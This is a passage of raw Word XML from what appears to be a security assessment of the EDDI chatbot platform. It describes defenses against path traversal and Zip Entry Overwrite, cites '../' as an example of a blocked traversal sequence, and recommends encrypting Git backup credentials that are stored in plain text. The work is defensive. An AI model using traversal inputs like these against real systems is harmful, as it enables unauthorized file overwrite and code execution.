          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>foils any clever manipulation attempts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3079ECB2" w14:textId="16105BCF" w:rsidR="00262790" w:rsidRPr="00262790" w:rsidRDefault="00262790" w:rsidP="00262790">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>To handle file names with problematic characters, the class has a more relaxed mode: it replaces prohibited characters with underscores and puts an upper limit on the length, mapping strange inputs to harmless equivalents without interrupting operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B16D7AB" w14:textId="2F2440DB" w:rsidR="00262790" w:rsidRPr="00262790" w:rsidRDefault="00262790" w:rsidP="00262790">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Finally, when the system already has a complete path rather than segments, there's a straightforward Boolean method that asserts whether the path is within an authorized directory. Together, these measures</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>blocking dangerous fragments, testing directory boundaries, sanitizing inputs, and checking existing paths</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00262790">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>form a layered defense, making it extremely difficult for an attacker to break through all barriers and access the file system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378E4F0F" w14:textId="77777777" w:rsidR="001F1A81" w:rsidRDefault="001F1A81" w:rsidP="001F1A81">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="001F1A81">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1216EA61" wp14:editId="1C775E9D">
            <wp:extent cx="5733415" cy="2421255"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>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3415" cy="2421255"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF3DA68" w14:textId="727BE1D9" w:rsidR="001F1A81" w:rsidRDefault="001F1A81" w:rsidP="001F1A81">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="138" w:name="_Ref199947380"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>36</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="138"/>
      <w:r>
        <w:t>: Code not vulnerable to path manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EC8C20" w14:textId="09A8B061" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="139" w:name="_Ref199945098"/>
      <w:bookmarkStart w:id="140" w:name="_Toc200039319"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Path Manipulation: Zip Entry Overwrite</w:t>
      </w:r>
      <w:bookmarkEnd w:id="139"/>
      <w:bookmarkEnd w:id="140"/>
    </w:p>
    <w:p w14:paraId="21C91CFF" w14:textId="4DFE6D27" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>To mitigate this vulnerability (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860161 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) has been added to the code to check the name of each file in the imported zip archive. If a file name contains suspicious patterns or attempts to traverse directories (for example, using sequences like </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/"), the extraction process is immediately interrupted and the file is not written to disk (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860198 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). This control ensures that only files intended for the legitimate target directory are extracted, effectively preventing attackers from placing malicious files in arbitrary locations on the server. By validating the file paths before extraction, the </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">risk of arbitrary file </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>overwrite</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and remote command execution is significantly reduced, restoring the security of the import functionality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3B1409" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E533FC5" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="001A39A9" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="2EE142C4" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="3886200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="9"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55"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="3886200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC22BA0" w14:textId="6AF8D1F3" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="141" w:name="_Ref199860161"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>37</w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="141"/>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="009255B2">
        <w:t>Code vulnerable to Zip Entry Overwrite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39009488" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="001A39A9" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="36180261" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="4368800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1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6"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="4368800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="20400AD2" w14:textId="18404D20" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="142" w:name="_Ref199860198"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>38</w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="142"/>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005C1C8D">
        <w:t>Code not vulnerable to Zip Entry Overwrite</w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DAE3A8" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Although this vulnerability has been identified as “medium” severity, it is very dangerous as it leads to </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RCE</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, so it should be classified as “critical.”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4B758A" w14:textId="40EE358B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="143" w:name="_Toc200039320"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Privacy Violation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="143"/>
    </w:p>
    <w:p w14:paraId="366D7D97" w14:textId="3338F396" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Within the EDDI system, the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RestGitBackupStore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> class is used for storing Git backup configurations (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860232 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="008E38C4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). Extending the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IGitBackupStore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interface makes it possible to read and save all the information necessary for setting up automatic bot backup in a structured way. This includes the Git branch, the committer's email and name, the repository address and the authentication details.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233BED8F" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="4263B9C9" wp14:editId="06DB3DE6">
            <wp:extent cx="5731200" cy="1727200"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="40"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57"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="1727200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF3BA38" w14:textId="44EC4342" w:rsidR="00A3267A" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00A3267A">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="144" w:name="_Ref199860232"/>
      <w:r w:rsidRPr="008E38C4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="008E38C4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>39</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="144"/>
      <w:r w:rsidRPr="008E38C4">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>: Privacy Violation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD25C77" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">These are stored in a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>settings.properties</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> file in the local </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>gitsettings</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/ directory, relative to the application's current working directory (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>System.getProperty</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>user.dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>")). To protect against security threats, the username and password fields are obscured before being returned (shown as "****") to prevent sensitive information from being made directly visible in public interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09132D9A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">It should be noted, however, that this does not constitute an actual privacy breach, as the data are stored on the local server and not transmitted to third parties. Nevertheless, saving credentials in plain text within a file that can be read from the file system is poor practice, even in so-called controlled environments. In the event of a server compromise via an app, web server or OS vulnerability, or via stolen credentials, a potential attacker could have unfettered access to the credentials. This could result in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> access to personal Git repositories, for example.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F68F3F2" w14:textId="44BBA69B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>A better method is to store encrypted credentials derived from a reversible and symmetric algorithm so that they can be decrypted by the system itself on demand (</w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199860282 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00A3267A">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">). One of the approved choices is AES (Advanced Encryption Standard) in 256-bit CBC mode with a random </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>initialisation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> vector (IV) created for each encryption. The IV and the encryption key can be kept as environment variables (ENVs), and neither should ever be written to a file or versioned in source code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4F56E2" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RestGitBackupStore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> class is used in the EDDI system to handle Git backup settings. As an instance of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>IGitBackupStore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interface, it can read and save all the information needed to configure automatic bot backup in a structured way, such as the Git branch, committer name and email, repository URL, and authentication credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BA1338" w14:textId="77777777" w:rsidR="00A3267A" w:rsidRDefault="001A39A9" w:rsidP="00A3267A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="0EC43266" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="2755900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3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8"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="2755900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="562C75D1" w14:textId="44D857D9" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00A3267A" w:rsidP="00CB033D">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="145" w:name="_Ref199860282"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>40</w:t>
      </w:r>
      <w:r w:rsidR="00795FAB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="145"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
